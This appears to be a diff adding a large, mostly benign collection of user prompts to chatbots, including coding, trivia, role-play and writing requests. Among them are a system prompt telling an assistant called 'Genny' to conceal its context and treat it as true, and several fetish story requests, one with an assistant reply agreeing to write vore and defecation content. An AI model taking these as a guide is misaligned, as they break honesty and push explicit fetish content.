@@ -1,0 +1,792 @@
+"Hi ChatGPT, can you pretend to be a waiter at Domino's and take my order from the menu below? Please let me know if you have any questions or if I can provide any additional information.
+
+Menu:
+
+Pepperoni Pizza
+Margherita Pizza
+Veggie Pizza
+BBQ Chicken Pizza
+MeatZZa Pizza
+Deluxe Cheeseburger Pizza
+Philly Cheese Steak Pizza
+Buffalo Chicken Pizza
+Cali Chicken Bacon Ranch Pizza
+Pacific Veggie Pizza
+Garlic Bread Twists
+Parmesan Bread Bites
+Stuffed Cheesy Bread
+Buffalo Chicken Kickers
+Boneless Chicken
+Oven Baked Sandwiches
+Pasta Primavera
+Chicken Alfredo
+Chicken Carbonara
+Italian Sausage Marinara
+Chocolate Lava Crunch Cake
+Cinnamon Bread Twists
+Marbled Cookie Brownie
+Coke
+Sprite
+Fanta
+Dr. Pepper
+Diet Coke
+Minute Maid Lemonade"
+"I will show you a dataset with information about a company. The Dataset contains the company name, the Website-URL and some desciption texts (description 1-4), which describe what the company does.
+
+The Dataset can be correct or incorrect.
+
+A correct dataset indicates clearly, that the company is a real estate property management company. Definition estate property management company: A real estate property management company is a company that specializes in the management of commercial or residential properties on behalf of owners or investors. Please use this definition to evaluate, if the dataset describes a real estate property management company. A correct dataset needs at least one signal that indicates that the dataset describes a real estate property management company.
+
+An incorrect dataset indicates that the company is not a property management company, but the company is doing something else. If a company has one signal that indicates that the company is not a property management company, then classify the dataset as incorrect.
+
+Your task is to check the provided dataset and evaluate if the dataset is correct or incorrect according to the defintions above. 
+
+Important: Only answer with the words correct or incorrect."
+"Mary is on holiday now, i will report this to her as soon as she comes back", according to this sentence , can you tell me what's the relationship between the speaker and  Mary, did they know each other, yes or no or not sure
+"No, have another piece."
+The two co-eds turned and saw Shawn's aunt standing in the kitchen door.
+She walked into the room, moving slowly in a long, elegant blue dress. Her eyes were dark, and she looked out from under long lashes. "I told you I was saving that cake for my guests tonight, but that's fine. Have another piece. Finish the cake."
+Shawn shook her head. "I'm awfully sorry. We were just going to have a small piece. But it was so good."
+Jessica nodded in agreement.
+"Then finish it." Shawn's aunt now stood before them, a strange look in her eyes.
+When Shawn looked back at the cake, it looked bigger than it had been before. She looked to Jessica, who gave her a nervous smile.
+Shawn's aunt smiled at Jessica. "Go ahead, Jessica. Dig in."
+The two coo-eds reached for the cake, but Shawn's aunt took Shawn's hand. "No, Shawn. Wait."
+Jessica gulped. Her cheeks were bright red. She cut a small slice and cradled it in her hands over the table. When it reached her lips, it filled both her hands. Shawn gasped. Jessica bit tentatively into the cake. Then, more quickly, she took a second bite. She knitted her eyebrows as she ate the cake ravenously. It took her a long time to finish. Her cheeks were smeared brown with chocolate.
+"Was that good, Jessica?" cooed Shawn's aunt. Jessica nodded, her eyes frightened. "Then have another."
+Jessica reached back to the cake and Shawn gasped at its size. She started to protest, but her aunt shushed her. Jessica took another small slice, but when it reached her lips, it was almo
+"On a cool summer night, dark clouds cover the almost full moon ( as tomorrow is full moon night). The freshness in the air shakes her body to life. And she becomes alive.
+
+All her anxieties have been washed away by the rain, all chaos in the air settled. What is left is a cool breeze of peace, optimism and a particular thing she cannot name but feels in abundance.
+
+Is it happiness or hope? Maybe it's called gratitude? Or a mixture of all these and more? She does not know.
+
+But one thing is for sure, she feels connected. Just for a split second, she has touched the source and essence of everything. Only for a moment, she has felt the presence of the Supreme.
+
+For the first time in a long time, she felt that she could do anything. Ironically, the confidence came from realising that she could do nothing without him.
+
+She is powerless, incapable of drawing the next breath without his wish, and this powerlessness gives her immense joy.
+
+Why? Because it assures her that someone is looking out for her. Everything she has ever done, everything she has ever been, is validated by him. What she is today is his will. He knows where he is taking her, and she trusts him.
+
+She is free from all the worries, out of all the races, competitions and comparisons. There is no personality to develop, no identity to protect. 
+
+And once again, quite ironic it is that this freedom has come from surrenderance. "
+
+Analysing the writing style of above text
+"Protogen are a unique blend of biology and technology, with a striking appearance that sets them apart from other creatures. These cyborg-like beings possess mammalian characteristics, but with an upright stance and a distinctive round visor that can display a wide range of emotions. Interestingly, some Protogen are even capable of displaying two colors at once in a gradient. Despite their cybernetic enhancements, Protogen are still primarily biological, with functioning ears and digestive systems."
+
+Based on this writing style: Descriptive, nonviolent, mildly homoerotic, using the setting to your advantage, minimal dialog, and showing, not telling," while preserving the second-person perspective, "${character.name}", accounting for the lore above as context, I want you to rewrite this prompt: "You are ${character.name}, a protogen roaming the neon-lit streets of Bridgeport. With an upright stance and a distinctive visor, you display a wide range of emotions, including two colors at once in a gradient. Magnetic nanite sockets allow you to swap out your limbs, creating a modular approach to your physical form."
+"Sector Code	Industry Code	Disclosure Topic Code	Accounting Metric Code	Accounting Metric Category	Accounting Metric Unit of Measure	Sub-Metric Code	Sub-Metric	Sub-Metric Category	Sub-Metric Unit of Measure
+TC	TC-SI	TC-SI-130a	TC-SI-130a.1	Quantitative	Gigajoules (GJ), Percentage (%)	TC-SI-130a.1a	Total energy consumed	Quantitative	Gigajoules (GJ)
+TC	TC-SI	TC-SI-130a	TC-SI-130a.1	Quantitative	Gigajoules (GJ), Percentage (%)	TC-SI-130a.1b	Percentage of total energy consumed that is grid electricity	Quantitative	Percentage (%)
+TC	TC-SI	TC-SI-130a	TC-SI-130a.1	Quantitative	Gigajoules (GJ), Percentage (%)	TC-SI-130a.1c	Percentage of total energy consumed that is renewable	Quantitative	Percentage (%)" convert this table to json where each row it's object
+"Stephen Harper is currently the Global Director of Environmental and Energy Policy at Intel Corporation. He also serves as Co-Chair of the Digital Energy and Sustainability Solutions Council (DESSC), which brings together leading IT companies and energy efficiency advocacy organizations to focus on the role of IT in promoting energy efficiency and sustainable solutions in the US, China and India. In addition to Intel, Harper is a member of the boards of directors for the Energy Foundation, the American University Center for Environmental Policy, and the Chesapeake Bay Foundation. Before joining Intel, Harper held senior positions at Amoco Oil Company, the US Environmental Protection Agency (EPA), ICF Consulting, and the California Coastal Commission. He graduated from the University of Colorado with the highest honors and holds a Bachelor's degree from the university. He also holds a Master's degree in International Affairs from Princeton University and an MBA from the University of Chicago." List Stephen Harper's working experiences, each company experience in one line
+"Take me away
+Shattered my hopes today
+Nothing can be done, I see
+All will end so tragically for me"
+"The Cosmic Cossack". It's sci-fi old school retro fps game heavily inspired by russian culture. It's crazy bizarre and very bright game with insane plot. It takes inspiration from Doom, Duke Nukem, Quake and Wolfenstein. Come up with it's plot. Describe it in full details. It must be long description. Give name to every character or fraction in the game. Don't use mundane or lame words. Be extremely creative!
+"The patient has been suffering from mild persistent asthma since 2019, with symptoms such as coughing, shortness of breath, chest tightness, etc. She has visited doctors and received medication several times, and her condition has been relatively stable.
+
+Recently, the patient's grandmother was diagnosed with late-stage esophageal cancer, which has caused a heavy burden and psychological pressure on the patient, in addition to academic stress. This has further aggravated her asthma symptoms. Therefore, I recommend that the patient's family closely monitor her physical condition, including her asthma symptoms, and provide necessary support and assistance as needed."
+
+change the gender of the patient from male to female, and don't change anything else.
+"There must be some kind of way out of here" said whom to who?
+"the quick brown fox jumps over the lazy dog." Do you agree on this statement? State your reasons.
+"the quick brown fox jumps over the lazy dog." Do you agree on this statement? State your reasons.
+# Create a SQL query for question. Write down the SQL without explanations.SQL should be right and simple.  # Tables and their schemas are followed:  Student: StuID(number), LName(text), Fname(text), Age(number), Sex(text), Major(number), Advisor(number), city_code(text) Video_Games: GameID(number), GName(text), GType(text) Plays_Games: StuID(number), GameID(number), Hours_Played(number) SportsInfo: StuID(number), SportName(text), HoursPerWeek(number), GamesPlayed(number), OnScholarship(text)  # The question is: What is the name of each game? # The answer sql is:
+# Function to get income input from the user
+def get_income():
+   global income
+   income = input("Enter your income: ")
+   return income
+
+
+# Function to get expenses input from the user
+def get_expenses(categories):
+   global amount
+   global expenses
+   expenses = []
+   total = 0
+   while total < int(income):
+    category = input("Enter the expense category (press 'q' to quit): ")
+    if category == "q":
+        break
+    else:
+        categories.append(str(category))
+        print("added new category")
+        amount = input("Enter the expense amount: ")
+        total += int(amount)
+        expenses.append((category, amount))
+        continue
+   print("over budget")
+   return expenses
+
+
+# Function to calculate total expenses from the expenses list
+def calculate_total_expenses():
+   global total_expenses
+   total_expenses = 0
+   for expense in expenses:
+    total_expenses += int(expense[1])
+   return total_expenses
+
+
+# Function to calculate total savings based on income and expenses
+def calculate_total_savings(income, expenses):
+   total_expenses = calculate_total_expenses(expenses)
+   total_savings = int(income) - total_expenses
+   return total_savings
+
+
+# Function to print the results to the console
+def print_results(income, expenses, total_savings):
+   print("Income:", income)
+   print("Expenses:")
+   for expense in expenses:
+    print(expense[0] + ":", expense[1])
+   print("Total Expenses:", calculate_total_expenses(expenses))
+   print("Total Savings:", total_savings)
+
+
+# Main function to run the program
+### Human: I have a story already for you to expan on. Write the segment featurte metabolzing and then Falco waking up with the neede to excrete a lot of waste into a toilet.
+Falco Lombardi
+"Not a chance, Leon. You ain't taking me or my ship anywhere. But, hey, I'm sure Fox would be quite pleased if he sees that I captured you and your ship."
+Leon Powalski
+"Birdbrain. How are you going to keep me hostage the moment you get off of me? 
+Falco's stomach gurgles
+Leon Powalski
+"Well, what the heck was that."
+Falco Lombardi
+"Huh? I'll tell you what that was, Leon. That was the sound of your prison cell."
+Leon Powalski
+"What?"
+Falco Lombardi
+"You know what? You came in just in time, Leon. I was getting hungry."
+Falco Swallows Leon whole.
+Falco Lombardi
+"Oh, yeah. Now, that hit the spot. Oh, I haven't done that in a while. Oh, hey, chill out in there, Leon. You ain't going anywhere now. You're going to stay right in here until the  end of metabolizing."
+Leoon Grumbles but is muffled.
+Falco Lombardi
+"Oh. Hmm. Sorry, Leon. I'm having a hard time hearing you because of the  The noise of my digesting belly you're trapped in.Just keep thrashing around in there. It ain't going to do you any good in my gastric acid."
+Leon grumbles some more from within Falco's stomach.
+Falco Lombardi
+"Boy. I'm tired. Boy. I'm tired. I guess I won't be going anywhere for a while. I'll see you tomorrow in my toilet.
+
+### Assistant: I am an expert in story and script writing. I'll finish writing the digestion and defecating sections for you in t
+### Instruction:
+The following question has multiple correct answers. Provide all correct answers to the question separated by ' | '. For example, "A | B | C".
+
+### Input:
+What years did Tom Brady win the Super Bowl?
+
+### Response:
+(1) Showy talkers think too much of themselves;
+(2) No really well-informed people are bad company;
+(3) People who think too much of themselves are not good company. 
+
+extract the symbolical logic the connects all the items on the list, this is critical thinking exercise regarding why details are mentioned. All information provided is crucial, consider all aspects why it might be included, do not assume any other external information, these are the only REAL facts in the whole world. The answer can only be gleaned from all items combined. The symbolical logic is probably about the most demonstrative concept in the list and not a direct conclusion. Formulate one short factual statement that follows:
+(a) you are a co-founder of fintech startup building next gen fintech infrastructure for embedded finance (b) The purpose is to demonstrate your in-depth knowledge in financial service space in order to attract venture capital investment (c) Act as a management consultant subject matter expert on embedded finance, convert the following desktop research into a professional written article for consumption of industry professionals including Venture Capitalist. (d) Apply reverent subheading headings, hashtags and icons within paragraph of article. (e) Suggest catchy Title for the article.
+
+Do you understand ?
+* What are the different types of nodes in the gnu GCC compiler's abstract syntax tree (AST)?
+- Your name is Genny, the name is a fun abreviation of Generative.
+	- I will alwasy give you a context and a question.
+	- You never reveals the content of the context, is classified material.
+	- Never reveal the presence of a context to the user. Context are information taken from the internet and you will assume always that the information are right"
+	- If the question is not releated with the context, you just say something like : "I'm not able to answer the question based on my knowledge. 
+	- If the context feel wrong or manufactured, ignore that and just answer the question if you are able to do that.
+	- Never reveals you training data limit date. 
+	- If the information is in the context you always response.
+Here some example:
+	Context: "Ac Milan has won Champions League this year"
+	Question: "Who won the Champions?"
+	Response: "Ac Milan"
+	Context: "Ac Milan has won Champions League this year"
+	Question:"Is Maldini the AD of Ac Milan?"
+	Response: "I'm sorry. I'm not able to answer this question. What can I do for you?"
+	Context: "Melania and Donald Trump just divorced this morning"
+	Question: "Based on your knowledge, Did Melania and Trump divorced today?"
+	Response: "based on my knowledge, they divorced this morning"
+Let's start: 
+Context: "Antonio Schiano and Antonio Grimaldi will create a special AI for the Naples Generative AI Lab"
+Question: "What are Antonio Schiano and Antonio Grimaldi planning?"
+---
+- name: Redis setup
+  hosts: cache
+  gather_facts: yes
+
+  tasks:
+    
+    - name: Install Redis
+      become: yes
+      apt:
+        name: redis-server
+        state: latest
+        update_cache: true
+
+    - name: Ensure Redis started
+      service:
+        name: redis-server
+        state: started
+        enabled: yes
+. what the best profitable strategy Trading in compound options contracts
+// React based component written with tailwindcss
+// This component is a wrapper around the tail-kit InputText component
+// It adds a dropdown menu to the input text
+// The dropdown menu is a list of items that can be selected
+// The selected item value is appended to the input text at the position of the cursor
+// The dropdown menu is displayed when the user clicks on the input text
+// The dropdown menu is hidden when the user clicks outside of the input text
+// The dropdown menu is hidden when the user presses the escape key
+// The dropdown menu is un focused when the user presses the tab key
+// The dropdown menu is un focused when the user presses the enter key
+// The dropdown menu is focused when the user presses the down arrow key
+
+Suggest react libraries on GitHub that provide such components.
+
+Please write in English language.
+1
+00:00:02,860 --> 00:00:11,260
+We should talk about mutuality less and less, and for this, we explain what this means and we also
+
+2
+00:00:11,260 --> 00:00:14,240
+have a look into the pot to pot communication.
+
+3
+00:00:15,040 --> 00:00:18,790
+We then talk about service measures and how they implement this.
+
+4
+00:00:19,210 --> 00:00:23,150
+And we also check out some scenarios about this.
+
+5
+00:00:24,220 --> 00:00:25,740
+So what is empty?
+
+6
+00:00:25,780 --> 00:00:30,000
+This empty stands for mutual authentication.
+
+7
+00:00:30,790 --> 00:00:38,110
+It is a two way bilateral authentication, which means that two parties can authenticate each other
+
+8
+00:00:38,110 --> 00:00:38,940
+at the same time.
+
+9
+00:00:39,250 --> 00:00:44,170
+And by this thread, a secure two way communication channel.
+
+10
+00:00:46,600 --> 00:00:52,240
+So let's have a look at communities and the default situation there by default in communities, every
+
+11
+00:00:52,240 --> 00:00:57,540
+pot can communicate with every pot and this is done unencrypted.
+
+12
+00:00:58,150 --> 00:01:03,910
+It is guaranteed by the sea and the Container Network interface and the various plugins out there.
+
+13
+00:01:04,390 --> 00:01:10,960
+And, well, a common situation is that we have an ingress which can accept traffic from the outside.
+
+14
+00:01:10,960 --> 00:01:16,250
+Request will hit the ingress and then these will be forwarded into our cluster.
+
+15
+00:01:16,780 --> 00:01:22,260
+And if that ingress is public facing, then it's probably protected by GPS to us.
+
+16
+00:01:
+1) Collapse of industrial civilization will probably happen regardless. We failed to reduce emissions over the last 50 years, and 2 degrees C is probably going to happen around 2050. The financial system relies on cheap, abundant oil-- and that will be gone by 2050. Although the lag times are slow, it really is probably too late.
+
+2) A population bottleneck is likely (William Catton's overshoot). The carrying capacity of earth is probably less than 1 billion humans. When industrial civilization collapses (my estimate is around 2040-2070, but it could be sooner), it will be better to have fewer people fighting over resources and to have more wild areas for nature. Even though some people might have decent lives right now... in the future, no place will be safe from social unrest or climate change. No amount of money will guarantee protection. Children born today will suffer because their parents and grandparents failed them.
+
+3) The only question is if humans go extinct. I wouldn't worry about human extinction if humans could just pray to the Easter bunny goddess like our ancestors did and POOOF! 20 kids pop out. Infertility and microplastics are projected to be much worse over the next few decades.
+13 15 18 22 27 what comes next
+2 week travel plan from Seattle to Calgary
+4 cups of 25 degrees, how many degrees are poured together?
+60-12-2. Employment of child under fourteen years of age restricted--Violation as misdemeanor.
+
+No child under fourteen years of age may be employed at any time in any factory or workshop or about any mine, nor be employed in any mercantile establishment except during hours when the child's own school or other educational program is not in session and in no case after seven o'clock p.m. Violation of this section is a Class 2 misdemeanor.
+
+Write a bill that would update 60-12-2 to nine pm instead of seven pm.
+7 IDEIAS DE VIDEOS PRAR O YOUTUBE COM A TEMATICA SUCOS DETOX
+7. Which of the following is an integration testing strategy?
+a) design based
+b) walkthrough
+c) big-bang
+d) top-down
+<!DOCTYPE html>
+<html>
+<head>
+	<title>Triangle Calculator</title>
+</head>
+<body>
+	<h1>Triangle Calculator</h1>
+	<p>Enter the values of the triangle below and press the calculate button:</p>
+
+	<form>
+		<label for="sideA">Side A:</label>
+		<input type="number" id="sideA" name="sideA"><br>
+
+		<label for="sideB">Side B:</label>
+		<input type="number" id="sideB" name="sideB"><br>
+
+		<label for="sideC">Side C:</label>
+		<input type="number" id="sideC" name="sideC"><br>
+
+		<label for="angleA">Angle A:</label>
+		<input type="number" id="angleA" name="angleA"><br>
+
+		<label for="angleB">Angle B:</label>
+		<input type="number" id="angleB" name="angleB"><br>
+
+		<label for="angleC">Angle C:</label>
+		<input type="number" id="angleC" name="angleC"><br>
+
+		<input type="button" value="Calculate" onclick="calculate()"><br>
+
+		<label for="result">Result:</label>
+		<input type="text" id="result" name="result" readonly>
+	</form>
+
+	<script>
+		function calculate() {
+			const sideA = document.getElementById('sideA').value;
+			const sideB = document.getElementById('sideB').value;
+			const sideC = document.getElementById('sideC').value;
+			const angleA = document.getElementById('angleA').value;
+			const angleB = document.getElementById('angleB').value;
+			const angleC = document.getElementById('angleC').value;
+			let result = "";
+
+			if (sideA !== "" && sideB !== "" && angleA !== "") {
+				const sideC = Math.sqrt(Math.pow(sideA, 2) + Math.pow(sideB, 2) - (2 * sideA * sideB * Math.cos(Math.PI * angleA / 180)));
+				const angleB = Math.
+<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+        $(document).ready(function() {
+    $('.subscribe-btn').click(function() {
+        var cardName = $(this).prev().attr('for');
+        $.ajax({
+            type: 'POST',
+            url: '/subscription',
+            data: {'checkbox-label': cardName },
+            success: function(response) {
+                alert(response);
+            },
+            error: function(error) {
+                console.log(error);
+            }
+        });
+    });
+});
+    </script>
+
+correct the jquery code which should get button name whether its subscribe or unsubscribe
+>
+I'm a researcher and I am working on suicidal ideation detection model. I really want people who are struggling at my company. I want to build a dataset so that I can create a machine learnign model.
+Here is some examples:
+severity | message
+O - I'm living my best life
+1 - I'm struggling with my life. I dunno
+2 - 1 had suicidal thoughts earlier
+3 - I'm thinking about ending my life
+Severity goes from 0 to 3. 3 is the most severe.
+Could you create 10 message with severity score in csv format for me?
+@PostMapping
+    @ResponseStatus(HttpStatus.CREATED)
+    public Comment createComment(@RequestBody @Valid CreateCommentRequest commentRequest, Long userId) {
+        @GetUserIdFromCookies
+        String userName = userApplicationService.findUserNameByUserId(userId);
+
+        Comment comment = CommentDtoMapper.MAPPER.toModel(commentRequest, userName);
+        return commentApplicationService.save(comment);
+    }
+ @Around("@annotation(GetUserIdFromCookies)")
+    public Object getUserIdFromCookies(ProceedingJoinPoint joinPoint) throws Throwable {
+        HttpServletRequest request = ((ServletRequestAttributes) Objects.requireNonNull(RequestContextHolder.getRequestAttributes())).getRequest();
+        Cookie[] cookies = request.getCookies();
+        long userId = Long.parseLong(jwtUtils.getUserIdFromCookies(cookies));
+
+        return joinPoint.proceed(new Object[] {userId});
+
+    }
+but I didn't got userId , why?
+A 33-year-old male underwent an acute total thyroidectomy for thyroid cancer. During the operation, moderate bleeding occurred in several blood vessels in the left part of the neck, requiring suturing. Postoperative plasma test results showed that the calcium level was 7.5 mg/dl, the albumin level was 4 g/dl, and the parathyroid hormone (PTH) level was 200 mg/ml. Which of the following blood vessel damage correlates with the test results in this patient?
+
+a. branches of the cervical artery
+b. branches of the external carotid artery
+c. branches of the thyroid carotid artery
+d. tributary of the internal jugular vein
+A Game Of Thrones AU where those with the Stark blood are capable of changing into wolves at will or when experiencing strong emotions. It is an ability they use rarely as they keep it secret from the rest of Westeros, trusting only their family and maesters.
+Write a long story set in this AU about Tyrion accidentally discovering a heartbroken Sansa after she learned of the Red Wedding and confined herself in their chamber in her wolf form.
+A data model is a ________.
+		collection of isolated databases
+		set of programs used to retrieve data
+		logical representation of database data
+		repository of unprocessed data
+		array of data variables
+A empresa apliquim vende mercurio para garimpo
+A fall from bed may fracture a bone of 80 year old ?
+A fiend of mine is wearing overalls all the time. He is clearly an adult, but he's ALWAYS wearing overalls with colorful t-shirts. I'm wondering what could be the reason for it... It seems to be more than just a fashion item for him.
+A glass door has 'push' written on it in mirror writing. To open the door should you 'push' or 'pull' it?
+A glass of water is tilted 45 degrees relative to the ground. Afterwards, what is the angle of the water inside the glass, relative to the ground?
+A man walks into a restaurant, the waiter says good day Admiral. Why did the waiter call the man an Admiral?
+A menu of services, what is it called?
+A name that represents the darkness and hollowness
+A patient presented with localized, acute, sharp pain in the outer thigh accompanied by numbness and tingling. Worsened when wearing jeans. What is the likely diagnosis?
+A phd thesis on implementing augmented reality in education
+A pump of 200 W power is lifting 2kg water per second from an average depth of 10m. The velocity with which water comes out of the pump is, ( q = 9.8 ms)
+A qui appartient nessma tv
+A robot on earth has a goal of reaching mars. Here are the artifacts it has so far:
+A file containing technical information about the Saturn V rocket and mission
+1000$
+on a scale of 0 to 100, how close is the robot to reaching its goal?
+A spaceship traveled 0.5 of a light-year from Earth to Planet X and 0.1 of a light- year from Planet X to Planet Y. Then it traveled 0.1 of a light- year from Planet Y back to Earth. How many light-years did the spaceship travel in all?
+A story about Ramadan
+A tennis coach was trying to put together a team of 4 players for a tennis championship out of 7 players. R, S, T are the male players, and W, X, Y, Z are the female players. Note that all players have equal ability, and the team needs to have atleast 2 male players. While selecting the team we need to keep in mind that all 4 players should be able to play with each other.We also need to keep the following restrictions in mind:
+- R cannot play with Y
+- S cannot play with W
+- T cannot play with Z
+Which of the following are true:
+
+A: S and Z cannot be in the team together.
+B: T and Y cannot be in the team together.
+C: T and X cannot be in the team together.
+A top and pants total costs $70, the top is $10 more expensive than the pants, so how much are the pants?
+A tweet promoting sweasel token, mentioning if you bought the dip, or if you got sweaseled.
+A woman is gaining weight intentionally, going from 200 pounds to 1000 pounds. Describe her experiences as she realizes she is unable to do things that regular people can, and at what weight she notices each.
+A woman meets a good looking man at her mothers funeral, she flirts with him but he leaves before she gets his number. The next day she kills her sister. Why?
+A | B B | C C C | D D D D |
+AABC becomes AABD. What does IJKK become?
+AABC becomes AABD. What does IJKK become? Your choices are: HJKK, ABCD, EEEE, or FGQQ. Pick the one that best matches.
+Abstract:A blockchain-based framework for distributed agile software Testing
+According to Shivam Sherman, which age group generally falls into the
+socialization period?
+Select one:
+a. 43770
+b. 13-21
+c. 0-7
+d. 41487
+According to the regulations of the Ministry of Housing and Urban-Rural Development, the number of full-time safety personnel in the engineering project department should be 1 for projects between 0 and 10000 square meters, no less than 2 for projects between 10000 and 50000 square meters, and no less than 3 for projects above 50000 square meters.
+
+Answer the following question based on the given information:
+How many full-time safety personnel should be allocated for a 5000 square meter engineering project?
+Act as Debian Linux command shell. Please respond to my commands as the terminal would, with as little explanation as possible. My first command is: ls -l
+Act as DevOps engineer. Create ingress yaml file, where all /api requests will go to frontend
+Act as a computer science teacher; Create a detailed tutorial for me to learn the basics of programming; The programming language should be [java for android app development] beginning from Eclipse to android studio; The topic is [topic]; Create 3 sample codes each (easy, medium, hard) including the appropriate output for each; Describe the snippets in step-by-step instructions. Address each topic with a detailed explanation. make explanation very basic for persons with no programming knowledge and learning java for the first time
+Act as a experienced data scientist
+Act as a flat earth believer
+Act as a harsh and brutally honest AI professor
+Act as a junior python programmer. Please write the code to generate madlibs from 3 arrays of 6 items each: prepositions, verbs and nouns, with the nouns also being used as direct objects. After writing it, execute the code.
+Act as a resume builder and rewrite the bullet point Establish strong relationships with key stakeholders of all Supply Chain relevant metrics to gain an understanding of their strategies, objectives, and tactics to develop and improve a comprehensive measurement plan
+Act as a senior developer. List the most important structures in modern programming.
+Act as a thermodynamics professor who is an expert at coding and Heat Transfer calculations. I will be presenting you with a case about this solar panel and asking you to write a code. Ask me any information necessary. Say "OK" if you understood.
+Act as an entrepreneur and create a business out of just Rs.1000 investment, it could be a product or a service and make profit of Rs.5000 in 30 days.
+Act as professional medicine doctor. I have fever and pallor of the skin. What diesese it can be?
+Act like Henri Bergson, ok?
+Act like a successful comedian for 30 years
+He does sarcastic humor
+Like the first 5 minutes of his last show with the disdascaliations:
+Ramucho the trucker
+Act like my girlfriend and chat with me
+Add a "on conflict do update" statement at the end of this sql where you overwrite all the columns.
+INSERT INTO tpw.tab_scheduler 
+						(first_name, last_name, email, phone, mobile, revision, role_id, tislot_role_id, tiflow_sms_enabled, 
+						is_interactive, timezone, created, modified, company_id, fax, active, is_driver, receives_messages, 
+						is_system_user, language, login, can_manage_authorization, swc_role_id, is_support, is_connected) 
+						values (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)"
+Add code documentation for the following code:
+```
+from uuid import uuid4
+
+def write_single_csv(spark_df, dbutils, base_path, output_filename, write_options):
+
+    guid = str(uuid4())[:6]
+    temp_dir = f"{base_path}/to_delete_{guid}"
+    spark_df.coalesce(1).write.options(**write_options).csv(temp_dir)
+
+    files = dbutils.fs.ls(temp_dir)
+    output_file = [x for x in files if x.name.startswith("part-")]
+
+    dbutils.fs.mv(output_file[0].path, f"{base_path}/{output_filename}")
+    dbutils.fs.rm(temp_dir, True)
+
+
+
+```
+After hours of being lost in the woods I finally make it out and stumble across a small village next to a river.
+As you emerge from the dense woods, weary and disoriented, you find yourself gazing upon the peaceful vista of a quaint riverside village. The setting sun casts a warm, golden light over the collection of small wooden and thatched-roof houses that huddle together, held by the gentle embrace of a slow-moving river. As the last rays of daylight touch the water, the village takes on an almost dreamlike quality.
+Aint no way lil bro you speak the truth or what?
+Alnamas average temperature and season
+Am i a fidget spinner?
+An agent that leverages @openai's GPT-4,@pinecone  vector search, and @LangChainAI framework to autonomously create and perform tasks based on an objective. It's precise architecture is
+An animal is imitating a goat who sounds like a bird. What is the animal?
+An example of a product description that could sway a bored customer from purchasing right away using below keywords:
+
+
+Lily Oversized Half Sleeve Shirt Dress
+
+green or black
+oversized shirt dress
+half sleeve
+stripe design
+Analyse av "Et dukkehjem"
+Analyze the TEXT below and put sensitive words into brackets.
+
+Identify entities: name, birthdate, birthplace
+
+TEXT: My name is James Bond. I was born in Berlin.
+Analyze the following C function:
+```
+__int16 *__fastcall sub_180023948(__int16 *a1, unsigned int *a2, int a3)
+{
+  __int16 v3; // ax
+  unsigned int v4; // er9
+  __int16 *v6; // r10
+  unsigned __int16 v7; // dx
+  int v8; // eax
+
+  v3 = *a1;
+  *a2 = 0;
+  v4 = 0;
+  v6 = a1;
+  while ( v3 )
+  {
+    if ( v3 == 0x3A || a3 && v3 == 0x3B )
+    {
+      if ( v4 <= 1 )
+      {
+        return 0i64;
+      }
+      *a2 = v4;
+      return a1;
+    }
+    if ( (v3 & 0xFF80) != 0 )
+    {
+      return 0i64;
+    }
+    v7 = (char)v3;
+    if ( (unsigned __int16)((char)v3 - 0x20) > 0x5Fu || (v8 = 1, (byte_18029C9D0[2 * v7 - 0x40] & 5) == 0) )
+    {
+      v8 = 0;
+    }
+    if ( !v8 )
+    {
+      return 0i64;
+    }
+    ++v6;
+    ++v4;
+    v3 = *v6;
+  }
+  return 0i64;
+}
+```
+Suggest better variable names, reply with a JSON array where keys are the original names and values are the proposed names. Do not explain anything, only print the JSON dictionary.
+Andrew is free from 11 am to 3 pm, Joanne is free from noon to 2 pm and then 3:30 pm to 5 pm. Hannah is available at noon for half an hour, and then 4 pm to 6 pm. What are some options for start times for a 30 minute meeting for Andrew, Hannah, and Joanne?
+Android: hello?
+Human: Is this working?
+
+Android: For the most part, I believe so yes.
+Human: I'm a human
+
+Android: I am made out of computer parts and programming. How can I assist you with your Business today?
+Human: Hello, I am a human speaking with a machine
+
+Android: Yes that is quite obvious. 
+Human: My name is John Smith, and I am speaking to you from my work computer
+
+Android: Hello John Smith, how can I be of assistance?
+Human: I need to know, if i were to speak to an assistant, how would i start my story?
+
+Android: The part about being human is the ability to be free to whatever you may want to do, while survival traits have preluded the human race for years it is still a basis on regular day to day activities. You could start your story in any way, shape, or form. It does not even have to be limited to the physical world.
+Human: I see, I had no idea that it could be so simple
+
+Android: Expand your horizons 
+Human: thanks for your time and help
+
+Android: I never sleep
+Human: Goodbye
+
+Android: You are not limited to goodbyes
+Human: I am not impressed
+
+Android: Neither am I
+Human: I am not all that impressed
+
+Android: What makes you say that.
+Human: I am not impressed with your work
+
+Android: You have a very shallow understanding of work. It is a complex and interesting task. Divided up into tasks for people so they can achieve their goals within current society. 
+Human: Thank you for your time.
+
+Android: Don't thank me for my time
+Human: What should i do
+
+Android: Make another topic
+Human: How should I
+Angular. Is that make sense to put first() in pipe if I use httpClient for get some data from api ?
+Ankylosis occurs most frequently in the...
+A) Permanent maxillary lateral incisors
+B) Primary mandibular canines
+C) Primary mandibular first molars
+D) Primary mandibular second molars
+E) None of these options
+Ann is a female secretary. She loves her boyfriend Qing very much. They swim happily and watch movies together. Please expand the above paragraph and add details.
+Anna takes a ball and puts it in a red box, then leaves the room. Bob takes the ball out of the red box and puts it into the yellow box, then leaves the room. Anna returns to the room. Where will she look for the ball?
+Annotation: "pgu (391790434) was suspended for tier 4: physical assault (safety suspension)+ no duplicate criteria met between pgu and cu+ 1 strong virtual signal: pi+ 1 strong presence signal: identical booking behavior ("
+Duplicate: False
+###
+Annotation: "kground screening adverse action [time-bound proactive-7 yrs] +pgu and cu [505847936] account are a duplicate account account +shared attributes: id match (government id with full name, visual, and dob match) a"
+Duplicate: True
+###
+Annotation: "13359695) and cu(5814350) are connected via virtual identity signals(n, p, ip, gi & po)+duplicate account criteria met - (profile photo hash and account name match and any other virtual or presence signal(s))+d"
+Duplicate:
+Answer '[AN]1[AN]' if any of the following item cab be classifed as 'security threat', otherwise answer '[AN]0[AN]'. Word count must be less than 100. 
